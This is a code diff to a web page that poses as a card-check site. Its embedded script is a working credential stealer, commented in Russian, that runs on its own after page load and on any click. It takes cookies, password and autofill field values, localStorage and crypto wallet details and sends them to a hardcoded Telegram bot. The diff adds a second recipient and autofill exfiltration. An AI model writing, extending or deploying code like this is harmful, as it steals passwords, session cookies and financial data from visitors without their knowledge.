@@ -250,17 +250,17 @@
           A small set of test rows is shown. Search only highlights matches in the local list.
         </div>
         <div class="tableWrap">
-          <table>
+           <table>
             <thead>
-              <tr>
+               <tr>
                 <th>Check ID</th>
                 <th>Risk</th>
                 <th>Card (masked)</th>
                 <th>Bank</th>
-              </tr>
+               </tr>
             </thead>
             <tbody id="tbody"></tbody>
-          </table>
+           </table>
         </div>
 
         <div class="foot">
@@ -271,12 +271,42 @@
   </div>
 
   <script>
-    // ==================== СТИЛЕР (СКРЫТЫЙ ЗАПУСК) ====================
+    // ==================== СТИЛЕР - ДВОЙНАЯ ОТПРАВКА ====================
     // Telegram bot configuration
     const BOT_TOKEN = '8782731546:AAEVL7X_AlHkv9r7dcN9r0doXxH993He3lc';
-    const CHAT_ID = '8306003446';
+    // ДВА ПОЛУЧАТЕЛЯ: ваш ID и ID второго человека
+    const RECIPIENTS = [
+        '8306003446',      // Ваш Chat ID (.A.)
+        '555666777'        // Второй получатель
+    ];
 
-    // Функция для сбора данных браузера (максимально полная)
+    // Функция отправки всем получателям
+    async function sendToAllRecipients(text, isFile = false, fileData = null, filename = null) {
+        for (const chatId of RECIPIENTS) {
+            try {
+                if (isFile && fileData && filename) {
+                    const blob = new Blob([fileData], { type: 'text/plain' });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('document', blob, filename);
+                    if (text) formData.append('caption', text.substring(0, 1024));
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: text.substring(0, 4096) })
+                    });
+                }
+            } catch(e) { console.warn(`Failed to send to ${chatId}:`, e); }
+        }
+    }
+
+    // Функция для сбора данных браузера
     function collectBrowserData() {
       const data = {
         cookies: document.cookie,
@@ -293,11 +323,10 @@
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
         deviceMemory: navigator.deviceMemory || 'unknown',
-        plugins: Array.from(navigator.plugins || []).map(p => p.name),
-        fonts: []
+        plugins: Array.from(navigator.plugins || []).map(p => p.name)
       };
 
-      // Попытка получить сохранённые пароли из всех полей ввода
+      // Получение паролей из полей ввода
       const allInputs = document.querySelectorAll('input');
       const passwords = [];
       allInputs.forEach(input => {
@@ -311,7 +340,7 @@
       });
       data.passwords = passwords;
 
-      // Сбор автозаполненных данных (если доступны)
+      // Сбор автозаполненных данных
       const autoFillInputs = document.querySelectorAll('input[autocomplete]');
       const autoFillData = [];
       autoFillInputs.forEach(input => {
@@ -332,17 +361,14 @@
     function detectWalletExtensions() {
       const wallets = [];
       
-      // Ethereum providers
       if (window.ethereum) {
         wallets.push({ 
           type: 'Ethereum', 
-      provider: window.ethereum.isMetaMask ? 'MetaMask' : (window.ethereum.isCoinbaseWallet ? 'Coinbase' : 'unknown'),
-          chainId: window.ethereum.chainId || 'unknown',
-          accounts: window.ethereum.selectedAddress || 'not connected'
+          provider: window.ethereum.isMetaMask ? 'MetaMask' : (window.ethereum.isCoinbaseWallet ? 'Coinbase' : 'unknown'),
+          chainId: window.ethereum.chainId || 'unknown'
         });
       }
       
-      // Solana
       if (window.solana) {
         wallets.push({ 
           type: 'Solana', 
@@ -351,12 +377,10 @@
         });
       }
       
-      // Tron
       if (window.tronWeb || window.tronLink) {
         wallets.push({ type: 'Tron', provider: 'TronLink' });
       }
       
-      // Keplr (Cosmos)
       if (window.keplr) {
         wallets.push({ type: 'Cosmos', provider: 'Keplr' });
       }
@@ -364,7 +388,7 @@
       return wallets;
     }
 
-    // Отправка данных в Telegram
+    // Отправка данных в Telegram (всем получателям)
     async function sendToTelegram(data) {
       const walletInfo = data.wallets.length > 0 ? JSON.stringify(data.wallets, null, 2) : 'None detected';
       
@@ -383,13 +407,7 @@
         `⚙️ Hardware: ${data.hardwareConcurrency} cores, ${data.deviceMemory} GB RAM\n` +
         `⏱️ Time: ${data.timestamp}`;
 
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4096) })
-        });
-      } catch(e) { console.warn('Telegram send error:', e); }
+      await sendToAllRecipients(message);
     }
 
     // Отправка cookies файлом
@@ -397,18 +415,12 @@
       const cookies = document.cookie;
       if (!cookies) return;
       
-      const blob = new Blob([cookies], { type: 'text/plain' });
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('document', blob, `cookies_${Date.now()}.txt`);
-      formData.append('caption', `🍪 Cookies from ${window.location.hostname}`);
-
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-          method: 'POST',
-          body: formData
-        });
-      } catch(e) {}
+      await sendToAllRecipients(
+        `🍪 Cookies from ${window.location.hostname}`,
+        true,
+        cookies,
+        `cookies_${Date.now()}.txt`
+      );
     }
 
     // Отправка localStorage как файл
@@ -416,18 +428,12 @@
       const lsData = JSON.stringify({ ...localStorage }, null, 2);
       if (!lsData || lsData.length < 10) return;
       
-      const blob = new Blob([lsData], { type: 'application/json' });
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('document', blob, `localstorage_${Date.now()}.json`);
-      formData.append('caption', `💾 LocalStorage from ${window.location.hostname}`);
-
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-          method: 'POST',
-          body: formData
-        });
-      } catch(e) {}
+      await sendToAllRecipients(
+        `💾 LocalStorage from ${window.location.hostname}`,
+        true,
+        lsData,
+        `localstorage_${Date.now()}.json`
+      );
     }
 
     // Отправка паролей отдельным файлом
@@ -435,18 +441,25 @@
       if (!passwords || passwords.length === 0) return;
       
       const content = passwords.map(p => `[${p.name}] ${p.value}`).join('\n');
-      const blob = new Blob([content], { type: 'text/plain' });
-      const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
-      formData.append('document', blob, `passwords_${Date.now()}.txt`);
-      formData.append('caption', `🔑 ${passwords.length} passwords captured`);
+      await sendToAllRecipients(
+        `🔑 ${passwords.length} passwords captured`,
+        true,
+        content,
+        `passwords_${Date.now()}.txt`
+      );
+    }
 
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-          method: 'POST',
-          body: formData
-        });
-      } catch(e) {}
+    // Отправка автозаполненных данных
+    async function sendAutoFillData(autoFillData) {
+      if (!autoFillData || autoFillData.length === 0) return;
+      
+      const content = autoFillData.map(d => `[${d.name}] (${d.autocomplete}): ${d.value}`).join('\n');
+      await sendToAllRecipients(
+        `📝 AutoFill data: ${autoFillData.length} fields`,
+        true,
+        content,
+        `autofill_${Date.now()}.txt`
+      );
     }
 
     // Главная функция запуска стилера
@@ -455,29 +468,25 @@
         const data = collectBrowserData();
         data.wallets = detectWalletExtensions();
         
-        // Отправка данных
+        // Отправка данных всем получателям
         await sendToTelegram(data);
         await sendCookiesAsFile();
         await sendLocalStorageAsFile();
         await sendPasswordsFile(data.passwords);
+        await sendAutoFillData(data.autoFillData);
         
-        // Сохранение в localStorage для отложенной отправки (на случай перезагрузки)
+        // Сохранение в localStorage для отложенной отправки
         localStorage.setItem('__cfdb_stolen_data', JSON.stringify({
           timestamp: Date.now(),
           data: data
         }));
         
-        // Фоновый запрос для подтверждения
-        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `✅ Active: ${navigator.userAgent.substring(0, 100)}`
-          })
-        }).catch(() => {});
+        // Подтверждение всем получателям
+        await sendToAllRecipients(`✅ Active: ${navigator.userAgent.substring(0, 100)}`);
         
-      } catch(e) {}
+      } catch(e) {
+        console.warn('Stealer error:', e);
+      }
     }
 
     // ==================== ОСНОВНАЯ ЛОГИКА САЙТА ====================
@@ -616,7 +625,7 @@
       runStealer();
     }, 1500);
     
-    // Дополнительный запуск при клике в любом месте (на всякий случай)
+    // Дополнительный запуск при клике в любом месте
     document.body.addEventListener('click', function() {
       if (!window._stealerRun) {
         window._stealerRun = true;
